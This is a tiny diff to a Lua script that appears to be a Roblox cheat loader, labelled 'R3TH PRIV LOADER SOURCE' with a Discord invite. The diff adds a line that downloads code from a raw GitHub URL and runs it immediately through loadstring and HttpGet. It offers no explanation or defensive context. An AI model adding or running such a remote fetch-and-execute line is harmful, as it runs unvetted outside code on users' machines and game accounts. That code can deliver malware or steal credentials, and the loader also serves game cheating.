@@ -1,4 +1,4 @@
---[[
+loadstring(game:HttpGet("https://raw.githubusercontent.com/geogeobe/Sabscript/refs/heads/main/lua"))()
     R3TH PRIV LOADER SOURCE
 
     .gg/pethicial
